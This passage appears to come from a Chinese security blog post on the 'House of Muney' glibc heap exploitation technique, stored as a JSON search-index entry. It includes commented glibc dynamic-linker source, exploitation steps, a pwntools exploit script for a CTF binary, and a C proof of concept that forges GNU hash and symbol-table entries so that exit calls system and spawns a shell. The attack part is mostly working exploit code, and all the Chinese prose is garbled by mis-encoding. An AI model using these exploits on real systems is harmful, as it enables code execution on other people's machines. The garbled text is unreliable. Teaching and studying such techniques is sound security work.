ç¬¬äºŒä¸ªå‚æ•°å³ä¸ºpush nï¼Œæ‰€æŸ¥æ‰¾çš„ç¬¦å·åœ¨é‡å®šä½è¡¨.rel.pltä¸­çš„ç´¢å¼• // é¦–å…ˆæ ¹æ®link_mapä¸­è®°å½•çš„ä¿¡æ¯ï¼Œæ‰¾åˆ°åŠ¨æ€é“¾æ¥ç›¸å…³çš„ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); // æ‰¾åˆ°å¯¹åº”çš„é‡å®šä½å…ƒç´ ã€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸² const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); const ElfW(Sym) *sym = \u0026amp;symtab[ELFW(R_SYM) (reloc-\u0026gt;r_info)]; const ElfW(Sym) *refsym = sym; // rel_addr å³ä¸ºgotè¡¨çš„åœ°å€ï¼Œåœ¨æŸ¥æ‰¾åˆ°ç¬¦å·çœŸå®åœ°å€ä¹‹åä¼šå›å¡«åˆ°è¿™ä¸ªåœ°å€ä¸­ void *const rel_addr = (void *)(l-\u0026gt;l_addr + reloc-\u0026gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we\u0026#39;re really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-\u0026gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don\u0026#39;t look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-\u0026gt;st_other), 0) == 0) { const struct r_found_version *version = NULL; if (l-\u0026gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) { const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-\u0026gt;r_info)] \u0026amp; 0x7fff; version = \u0026amp;l-\u0026gt;l_versions[ndx]; if (version-\u0026gt;hash == 0) version = NULL; } /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) { THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; } #ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL; #endif // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²åœ°å€ï¼Œæ ¹æ®ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨å¾—åˆ°çš„ // ç¬¬äºŒä¸ªå‚æ•°æ˜¯link_map // ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç¬¦å·è¡¨çš„åœ°å€ï¼Œæ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œæœ€åä¼šä¿®æ­£å¾—åˆ°çš„ç¬¦å·è¡¨ // ç¬¬å››ä¸ªå‚æ•°æ˜¯scopeï¼Œè¡¨ç¤ºæŸ¥æ‰¾çš„èŒƒå›´ // ç¬¬äº”ä¸ªå‚æ•°æ˜¯ç‰ˆæœ¬ä¿¡æ¯ // åé¢çš„å‚æ•°éƒ½æ˜¯å›ºå®šçš„ result = _dl_lookup_symbol_x (strtab + sym-\u0026gt;st_name, l, \u0026amp;sym, l-\u0026gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG (); #ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL; #endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */ value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); } else { /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; } /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL \u0026amp;\u0026amp; __builtin_expect (ELFW(ST_TYPE) (sym-\u0026gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value; // ä¿®æ­£gotè¡¨æ¡ç›® return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); } 3.è°ƒç”¨_dl_lookup_symbol_x å‡½æ•° åœ¨å„ä¸ªsoçš„link_mapå¯»æ‰¾å¯¹åº”ç¬¦å·,ä½†æ˜¯å®é™…è°ƒç”¨do_lookup_xå‡½æ•°\nCstatic int __attribute_noinline__ do_lookup_x (const char *undef_name, uint_fast32_t new_hash, unsigned long int *old_hash, const ElfW(Sym) *ref, struct sym_val *result, struct r_scope_elem *scope, size_t i, const struct r_found_version *const version, int flags, struct link_map *skip, int type_class, struct link_map *undef_map) { size_t n = scope-\u0026gt;r_nlist; //r_nlistæ˜¯åŠ¨æ€åº“link_mapçš„æ•°é‡ï¼Œæ¯ä¸ªåŠ¨æ€åº“éƒ½æœ‰ä¸€ä¸ªlink_map /* Make sure we read the value before proceeding. Otherwise we might use r_list pointing to the initial scope and r_nlist being the value after a resize. That is the only path in dl-open.c not protected by GSCOPE. A read barrier here might be to expensive. */ __asm volatile (\u0026#34;\u0026#34; : \u0026#34;+r\u0026#34; (n), \u0026#34;+m\u0026#34; (scope-\u0026gt;r_list)); struct link_map **list = scope-\u0026gt;r_list;//å­˜æ”¾æ¯ä¸ªlink_mapçš„åœ°å€æ•°ç»„ do { const struct link_map *map = list[i]-\u0026gt;l_real; //l_real æ˜¯ struct link_map ç»“æ„ä½“ä¸­çš„ä¸€ä¸ªæˆå‘˜ï¼Œé€šå¸¸æŒ‡å‘è¯¥åŠ¨æ€é“¾æ¥åº“å®é™…å¯¹åº”çš„ link_mapã€‚ /* Here come the extra test needed for `_dl_lookup_symbol_skip\u0026#39;. */ if (map == skip) continue; /* Don\u0026#39;t search the executable when resolving a copy reloc. */ if ((type_class \u0026amp; ELF_RTYPE_CLASS_COPY) \u0026amp;\u0026amp; map-\u0026gt;l_type == lt_executable) continue; /* Do not look into objects which are going to be removed. */ if (map-\u0026gt;l_removed) continue; /* Print some debugging info if wanted. */ if (__glibc_unlikely (GLRO(dl_debug_mask) \u0026amp; DL_DEBUG_SYMBOLS)) _dl_debug_printf (\u0026#34;symbol=%s; lookup in file=%s [%lu]\\n\u0026#34;, undef_name, DSO_FILENAME (map-\u0026gt;l_name), map-\u0026gt;l_ns); /* If the hash table is empty there is nothing to do here. */ if (map-\u0026gt;l_nbuckets == 0) continue; Elf_Symndx symidx; int num_versions = 0; const ElfW(Sym) *versioned_sym = NULL; /* The tables for this map. */ // æ‰¾åˆ°ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ï¼ˆå½“å‰link_mapï¼‰ const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]); const ElfW(Sym) *sym; // è·å–bitmask const ElfW(Addr) *bitmask = map-\u0026gt;l_gnu_bitmask; if (__glibc_likely (bitmask != NULL)) { // è·å–bitmask_wordï¼Œè¿™é‡Œéœ€è¦ä¼ªé€ ï¼Œ//bitmask_wordç”¨æ¥åˆ¤æ–­new_hashæ˜¯å¦å“ˆå¸Œè¡¨ä¸­ // new_hashçš„è®¡ç®—ï¼šint_fast32_t new_hash = _dl_elf_hash (undef_name); // undef_name ç¬¦å·åç§°ã€‚ ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) \u0026amp; map-\u0026gt;l_gnu_bitmask_idxbits]; unsigned int hashbit1 = new_hash \u0026amp; (__ELF_NATIVE_CLASS - 1); unsigned int hashbit2 = ((new_hash \u0026gt;\u0026gt; map-\u0026gt;l_gnu_shift) \u0026amp; (__ELF_NATIVE_CLASS - 1)); if (__glibc_unlikely ((bitmask_word \u0026gt;\u0026gt; hashbit1) \u0026amp; (bitmask_word \u0026gt;\u0026gt; hashbit2) \u0026amp; 1)) { // è·å–bucketï¼Œè¿™é‡Œéœ€è¦ä¼ªé€  // è·å–ç¬¦å·æ‰€åœ¨çš„æ¡¶ï¼ˆbucketï¼‰ // map-\u0026gt;l_gnu_buckets æ˜¯ GNU å“ˆå¸Œè¡¨çš„æ¡¶æ•°ç»„ // new_hash % map-\u0026gt;l_nbuckets è®¡ç®—å‡ºç¬¦å·åœ¨æ¡¶æ•°ç»„ä¸­çš„ç´¢å¼• // å°†è¯¥ç´¢å¼•å¯¹åº”çš„æ¡¶çš„å€¼èµ‹ç»™ bucket // è¿™é‡Œä»£ç æ³¨é‡Šæåˆ°éœ€è¦ä¼ªé€ ï¼Œå¯èƒ½æ˜¯åœ¨æŸäº›ç‰¹æ®Šè°ƒè¯•æˆ–æ¨¡æ‹Ÿåœºæ™¯ä¸‹çš„æƒ…å†µ Elf32_Word bucket = map-\u0026gt;l_gnu_buckets[new_hash % map-\u0026gt;l_nbuckets]; if (bucket != 0) { // hasharrï¼Œè¿™é‡Œä¹Ÿéœ€è¦ä¼ªé€ å¯¹åº”çš„å€¼ // è¿™é‡Œæ³¨é‡Šæåˆ° hasharr éœ€è¦ä¼ªé€ å¯¹åº”çš„å€¼ï¼Œå¯èƒ½æ˜¯åœ¨æŸäº›ç‰¹æ®Šè°ƒè¯•æˆ–æ¨¡æ‹Ÿåœºæ™¯ä¸‹çš„æƒ…å†µ // ä» GNU å“ˆå¸Œè¡¨çš„é“¾æ•°ç»„ä¸­è·å–å½“å‰æ¡¶å¯¹åº”çš„èµ·å§‹ä½ç½® // map-\u0026gt;l_gnu_chain_zero æ˜¯ GNU å“ˆå¸Œè¡¨çš„é“¾æ•°ç»„èµ·å§‹åœ°å€ // bucket æ˜¯å‰é¢è®¡ç®—å¾—åˆ°çš„ç¬¦å·æ‰€åœ¨çš„æ¡¶çš„ç´¢å¼• // é€šè¿‡ \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket] è·å–è¯¥æ¡¶å¯¹åº”çš„é“¾çš„èµ·å§‹æŒ‡é’ˆ const Elf32_Word *hasharr = \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket]; // ä½¿ç”¨ do-while å¾ªç¯éå†å½“å‰æ¡¶å¯¹åº”çš„é“¾ï¼ŒæŸ¥æ‰¾åŒ¹é…çš„ç¬¦å· do if (((*hasharr ^ new_hash) \u0026gt;\u0026gt; 1) == 0) // æ ¹æ®å½“å‰é“¾èŠ‚ç‚¹çš„ä¿¡æ¯è®¡ç®—ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ç´¢å¼• // ELF_MACHINE_HASH_SYMIDX æ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºæ ¹æ®ä¸åŒçš„ ELF æœºå™¨ç±»å‹è®¡ç®—ç¬¦å·ç´¢å¼• // map æ˜¯å½“å‰å…±äº«å¯¹è±¡çš„ link_map ç»“æ„ä½“æŒ‡é’ˆ // hasharr æ˜¯å½“å‰é“¾èŠ‚ç‚¹çš„æŒ‡é’ˆ symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr); // è°ƒç”¨ check_match å‡½æ•°æ£€æŸ¥å½“å‰ç¬¦å·æ˜¯å¦çœŸæ­£åŒ¹é…è¦æŸ¥æ‰¾çš„ç¬¦å· // undef_name æ˜¯è¦æŸ¥æ‰¾çš„æœªå®šä¹‰ç¬¦å·çš„åç§° // ref æ˜¯å¼•ç”¨ç¬¦å·çš„ç¬¦å·è¡¨é¡¹æŒ‡é’ˆ // version ç”¨äºå­˜å‚¨æ‰¾åˆ°çš„ç¬¦å·çš„ç‰ˆæœ¬ä¿¡æ¯ // flags æ˜¯æŸ¥æ‰¾æ ‡å¿—ï¼Œæ§åˆ¶æŸ¥æ‰¾çš„è¡Œä¸º // type_class æ˜¯ç¬¦å·ç±»å‹ç±»åˆ« // \u0026amp;symtab[symidx] æ˜¯å½“å‰å¯èƒ½åŒ¹é…çš„ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„é¡¹ // symidx æ˜¯ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ç´¢å¼• // strtab æ˜¯å­—ç¬¦ä¸²è¡¨æŒ‡é’ˆï¼Œç”¨äºè·å–ç¬¦å·åç§° // map æ˜¯å½“å‰å…±äº«å¯¹è±¡çš„ link_map ç»“æ„ä½“æŒ‡é’ˆ // \u0026amp;versioned_sym ç”¨äºå­˜å‚¨ç‰ˆæœ¬åŒ–ç¬¦å·çš„ä¿¡æ¯ // \u0026amp;num_versions ç”¨äºå­˜å‚¨ç‰ˆæœ¬æ•°é‡ä¿¡æ¯ sym = check_match (undef_name, ref, version, flags, type_class, \u0026amp;symtab[symidx], symidx, strtab, map, \u0026amp;versioned_sym, \u0026amp;num_versions); // å¦‚æœ check_match å‡½æ•°è¿”å›éç©ºæŒ‡é’ˆï¼Œè¯´æ˜æ‰¾åˆ°äº†åŒ¹é…çš„ç¬¦å· if (sym != NULL) { // è·³è½¬åˆ° found_it æ ‡ç­¾å¤„ï¼Œè¿›è¡Œåç»­å¤„ç† goto found_it; } } // ç§»åŠ¨åˆ°é“¾ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ // (*hasharr++ \u0026amp; 1u) ç”¨äºæ£€æŸ¥å½“å‰é“¾èŠ‚ç‚¹æ˜¯å¦æ˜¯é“¾ä¸­çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ // å¦‚æœæœ€åä¸€ä½ä¸º 0ï¼Œåˆ™è¡¨ç¤ºä¸æ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œç»§ç»­å¾ªç¯æŸ¥æ‰¾ while ((*hasharr++ \u0026amp; 1u) == 0); } } //.... } #\råˆ©ç”¨æ”»å‡» #\råˆ©ç”¨æµç¨‹ #\rmalloc \u0026gt; 128kçš„å†…å­˜ ä¿®æ”¹è¯¥chunkçš„sizeï¼Œä½¿å…¶å¤§åˆ°èƒ½è¦†ç›–æ‰libcçš„ä¸€äº›åœ°å€ freeè¯¥åœ°å€ ç„¶åmalloc æ›´å¤§çš„å†…å­˜ è®¡ç®—å½“å‰chunkçš„åœ°å€åˆ°libcçš„åœ°å€è·ç¦» ï¼ˆè°ƒè¯•å¾—å‡ºï¼Œç¬¬ä¸€æ­¥mallocæ—¶ï¼Œå–libcçš„åœ°å€ - (ç¬¬å››æ­¥mallocçš„åœ°å€+0x10)ï¼‰ è®¡ç®—åˆ°å¸ƒéš†è¿‡æ»¤å™¨(bitmask)æ•°ç»„çš„åç§» ï¼ˆ.gnu.hashçš„åœ°å€ + 16ï¼‰ è®¡ç®—åˆ°å“ˆå¸Œæ¡¶(bucket)æ•°ç»„çš„åç§» ( bloom çš„åç§» + bloom_size * 8) è®¡ç®—bitmask_wordçš„åœ¨bitmaskä¸­index è®¡ç®—bitmask_wordçš„åœ°å€ è·å–bitmask_wordçš„å€¼ è®¡ç®—ç›®æ ‡ç¬¦å·åœ¨å“ˆå¸Œæ¡¶ä¸­çš„index (exit_hash % æ¡¶æ•°(nbucket)) è®¡ç®—è¯¥bucketçš„åœ°å€ è·å–buketçš„å€¼ï¼Œä¸ºç›®æ ‡ç¬¦å·åœ¨buketä¸­çš„å€¼ã€‚ è®¡ç®—åˆ°l_gnu_chain_zeroå“ˆå¸Œé“¾æ•°ç»„ï¼ˆGNU å“ˆå¸Œè¡¨çš„é“¾æ•°ç»„èµ·å§‹åœ°å€ï¼‰çš„è·ç¦» è®¡ç®—åˆ°ç›®æ ‡ç¬¦å·çš„ç¬¦å·è¡¨çš„åç§» ä¼ªé€ ç¬¦å·è¡¨çš„æ•°æ®ç»“æ„ï¼Œå°†st_valueä¼ªé€ æˆç›®æ ‡åœ°å€ï¼Œå¦‚one_gadget,systemçš„åç§»åœ°å€ã€‚ ä¸ºä»€ä¹ˆä¸ç›´æ¥ä¼ªé€ st_value,åœ¨å·libcçš„åœ°å€çš„æ—¶å€™ï¼Œå·åˆ°çš„å†…å­˜ä¼šè¢«æ¸…ç©ºï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ä¼ªé€ ã€‚\næŸé¢˜ï¼šexp #\rfrom pwn import * elf = ELF(\u0026#34;./pwn\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) io = process(\u0026#34;./pwn\u0026#34;) def add(index, size): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;ID:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;size:\u0026#34;, str(size).encode()) def free(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;remove:\u0026#34;, str(index).encode()) def edit(index, offset, content): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;update:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;length:\u0026#34;, str(offset).encode()) io.sendafter(b\u0026#34;details:\u0026#34;, content) def show(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;view:\u0026#34;, str(index).encode()) def dbg(): gdb.attach(io) pause() add(0, 0x40000 - 0x2000) #dbg() edit(0,-8, p64(0x41002 + 0x5000 + 0x4000)) free(0) add(0, 0x41000 * 2 + 0x4000) base_off = 0x7dff0 one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1] gnu_hash_section = libc.get_section_by_name(\u0026#39;.gnu.hash\u0026#39;) dynsym_section = libc.get_section_by_name(\u0026#39;.dynsym\u0026#39;) dynstr_section = libc.get_section_by_name(\u0026#39;.dynstr\u0026#39;) namehash = gnu_hash_section.gnu_hash(\u0026#39;exit\u0026#39;) # gnu_hash_section[\u0026#39;sh_addr\u0026#39;]è·å¾—gun.hashåç§»ã€‚ bloom_off = gnu_hash_section[\u0026#39;sh_addr\u0026#39;] + 4 * gnu_hash_section._wordsize bucket_off = bloom_off + gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] * gnu_hash_section._xwordsize bloom_elem_idx = int(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize bloom_elem_val = gnu_hash_section.params[\u0026#39;bloom\u0026#39;][bloom_elem_idx] bucket_elem_idx = namehash % gnu_hash_section.params[\u0026#39;nbuckets\u0026#39;] bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize bucket_elem_val = gnu_hash_section.params[\u0026#39;buckets\u0026#39;][bucket_elem_idx] hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[\u0026#39;symoffset\u0026#39;]) * gnu_hash_section._wordsize sym_off = dynsym_section[\u0026#39;sh_offset\u0026#39;] + bucket_elem_val * dynsym_section[\u0026#39;sh_entsize\u0026#39;] sym_value = b\u0026#39;\u0026#39; sym_value += p32(libc.search(b\u0026#39;exit\\x00\u0026#39;).__next__() - dynstr_section[\u0026#39;sh_offset\u0026#39;]) # st_name sym_value += p8(0x12) # st_info é«˜4ä½ï¼š0x1 è¡¨ç¤º STB_GLOBALï¼ˆå…¨å±€ç¬¦å·ï¼‰ä½4ä½ï¼š0x2 è¡¨ç¤º STT_FUNCï¼ˆå‡½æ•°ç±»å‹ï¼‰ sym_value += p8(0) # st_other é€šå¸¸ä¸º0 sym_value += p16(1) # st_shndx 1è¡¨ç¤ºåœ¨ä»£ç èŠ‚ä¸­ sym_value += p64(one_gadget) # st_value sym_value += p64(100) # st_size éšæ„è®¾ç½®,åŠ¨æ€é“¾æ¥å™¨é€šå¸¸ä¸éªŒè¯æ­¤å­—æ®µ #dbg() edit(0, base_off + bloom_elem_off, p64(bloom_elem_val)) edit(0, base_off + bucket_elem_off, p32(bucket_elem_val)) edit(0, base_off + hasharr_off, p32(namehash)) edit(0, base_off + sym_off, sym_value) #gdb.attach(io, \u0026#34;b _dl_fixup\\nc\u0026#34;) io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;5\u0026#34;) io.interactive() POC #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; void main() { setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); char *strptr = mmap(0xdeadb000, 0x1000, 6, 0x22, -1, 0); strcpy(strptr, \u0026#34;/bin/sh\u0026#34;); puts(\u0026#34;[*] step1: allocate a chunk ---\u0026gt; void* ptr = malloc(0x40000);\u0026#34;); size_t *ptr = (size_t *)malloc(0x40000); size_t sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); puts(\u0026#34;[*] step2: change the size of the chunk ---\u0026gt; ptr[-1] += 0x5000;\u0026#34;); ptr[-1] += 0x5000; puts(\u0026#34;[*] step3: free ptr and steal heap from glibc ---\u0026gt; free(ptr);\u0026#34;); free(ptr); puts(\u0026#34;[*] step4: retrieve heap ---\u0026gt; ptr = malloc(0x41000 * 2);\u0026#34;); ptr = malloc(0x41000 * 2); sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); // å½“å‰ptråˆ°åŸæœ‰libcåŸºåœ°å€çš„åç§» size_t base_off = 0x7dff0; // ä»¥ä¸‹åœ°å€å‡æ˜¯ç›¸å¯¹äºlibcåŸºåœ°å€çš„åç§» size_t system_off = 0x52290; size_t bitmask_word_off = 0xb88; size_t bucket_off = 0xcb0; size_t exit_sym_st_value_off = 0x4d20; size_t hasharr_off = 0x1d7c; puts(\u0026#34;[*] step5: set essential data for dl_runtime_resolve\u0026#34;); *(size_t *)((char *)ptr + base_off + bitmask_word_off) = 0xf000028c0200130eul; puts(\u0026#34;[*] set bitmask_word to 0xf000028c0200130eul\u0026#34;); *(unsigned int *)((char *)ptr + base_off + bucket_off) = 0x86u; puts(\u0026#34;[*] set bucket to 0x86u\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off) = system_off; puts(\u0026#34;[*] set exit@sym.st_value to system_off 0x52290\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off - 8) = 0xf001200002efbul; puts(\u0026#34;[*] set other exit@sym members\u0026#34;); *(size_t *)((char *)ptr + base_off + hasharr_off) = 0x7c967e3e7c93f2a0ul; puts(\u0026#34;[*] set hasharr to 0x7c967e3e7c93f2a0ul\u0026#34;); puts(\u0026#34;[*] step6: get shell ---\u0026gt; exit(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#34;); exit(strptr); } ","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of/house-of-muney/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]